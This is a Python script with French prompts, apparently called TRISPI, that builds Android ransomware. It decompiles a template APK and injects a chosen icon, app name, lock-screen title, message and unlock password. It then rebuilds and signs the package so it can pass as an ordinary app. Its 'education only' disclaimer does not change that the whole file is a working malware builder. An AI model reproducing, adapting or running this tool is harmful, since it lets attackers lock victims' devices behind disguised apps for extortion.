#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

r = "\033[1;31m"
g = "\033[0;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"
Bc = "\033[1;36m"
bn = "\033[0;34m"

app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""


def banner():
    print(w+b+"                                                           ")
    print(w+b+"                                                           ")
    print(w+b+"                                                           ")
    print(w+b+" _____ ____  ___ ____  ____ ___         "+g+"TRISPI - version 1.0")
    print(w+b+"|_   _|  _ \|_ _/ ___||  _ \_ _|     "+w+"   "+w+"------------------")
    print(w+w+"  | | | |_) || |\___ \| |_) | |         "+w+"Ecrit par "+b+"@trispi")
    print(w+r+"  | | |  _ < | | ___) |  __/| |         "+w+"L'auteur n'est"+r+ " pas"+w+" responsable des dommages")
    print(w+r+"  |_| |_| \_\___|____/|_|  |___|                "+w+"causés par ce programme")
    print(w+b+"                                                           ")
    print(w+b+"                                                           ")
    print(w+b+"                                                           ")
    print(w+b+"                                                           ")

def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+r+" Erreur dans l'écriture de "+file)

def start():
    global app_icon, app_name, alert_title, alert_desc, key_pass
    os.system("clear")
    banner()
    print(r+"[!]"+w+" Veuillez utiliser ce programme seulement pour l'éducation")
    ask = str(input(g+"[!]"+w+" Êtes-vous d'accord ? (o/n): ").lower())
    if ask in ("oO0"): pass
    else: exit(r+"[!]"+r+" Ne soyez pas méchant !")
    print(f"""
    {Bc}TRISPI{w} est une simple attaque par Ransomware pour Android
    {w}L'utilisateur peut modifier l'icon, le nom, le mot de passe de l'application et autres.
    {d}Si vous oubliez le mot de passe, veuillez redémarrer votre apareil !{w}
    """)
    print(b+"> "+w+os.popen("curl ifconfig.co/city --silent").readline().strip()+" "+os.popen("curl ifconfig.co/country --silent").readline().rstrip()+time.strftime(" %d/%m/%Y (%H.%M.%S)"))
    print(b+">"+w+" Utilisez CTRL + C pour quitter")
    print(w+"-"*43)
    while True:
        x = str(input(w+"* Entrez le chemin de l'icone (PNG seulement): "+g))
        if os.path.isfile(x):
            if ".png" in x:
                app_icon = x
                break
            else: print(r+"[!]"+r+" Fichier non accepté, format PNG seulement !")
        else: print(r+"[!]"+r+" Fichier non trouvé, veuillez réessayer !")
    while True:
        x = str(input(w+"* Entrez le nom de l'application: "+g))
        if len(x) != 0:
            app_name = x
            break
        else: continue
    while True:
        x = str(input(w+"* Entrez un titre pour le bloquage "+g))
        if len(x) != 0:
            alert_title = x
            break
        else: continue
    while True:
        x = str(input(w+"* Entrez une description pour le bloquage: "+g))
        if len(x) != 0:
            alert_desc = x
            break
        else: continue
    while True:
        x = str(input(w+"* Séléctionnez un mot de passe: "+g))
        if len(x) != 0:
            key_pass = x
            break
        else: continue
    os.system("clear")    
    print(bn+"* Construction de votre APK ...")
    print(bn+"-"*43+d)
    os.system("rm -r trispi")
    os.system("apktool d trispi.apk")
    imgpath = [
        "trispi/res/drawable-mdpi-v4/ic_launcher.png",
        "trispi/res/drawable-xhdpi-v4/ic_launcher.png",
        "trispi/res/drawable-hdpi-v4/ic_launcher.png",
        "trispi/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "trispi/res/values/strings.xml"
    print(g+"I: Incluant strings "+strings)
    smali = os.popen(f"find -L trispi/ -name '*0000.smali'","r").readline().strip()
    print(g+"I: Utilisant smali "+os.path.basename(smali))
    writefile(strings,"appname",app_name)
    print(g+"I: Ajout du nom avec "+app_name)
    writefile(strings,"alert_title",alert_title)
    print(g+"I: Ajout du titre avec "+alert_title)
    writefile(strings,"alert_desc",alert_desc)
    print(g+"I: Ajout de la description avec "+str(len(alert_desc))+" words")
    writefile(smali,"key_pass",key_pass)
    print(g+"I: Ajout du mot de passe avec "+key_pass)
    time.sleep(3)
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = str(width)+"x"+str(height)
                logo = os.path.basename(app_icon)
                os.system("cp -R "+app_icon+" "+logo)
                os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                os.system("rm -rf "+logo)
                print("I: Ajout de l'icone avec "+os.path.basename(app_icon)+" size: "+size)
        else: exit(1)
    os.system("apktool b trispi -o final.apk;rm -rf trispi")
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ","").lower() + ".apk"
        os.system("mv final-aligned-signed.apk "+out)
        os.system("mkdir -p apk")
        os.system("mv "+out+" apk")
        print(b+">"+g+" Résultat sauvegardé ici: "+b+" "+"apk/"+out+w)
        exit(g+"\n[!]"+w+" Merci d'avoir utilisé ce programme !\n    "+Bc+"FIN")
    else: print(r+"[!]"+r+" Erreur lors de la signature de l' APK")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(g+"\n[!]"+w+" Merci d'avoir utilisé ce programme !\n    "+Bc+"FIN")
        
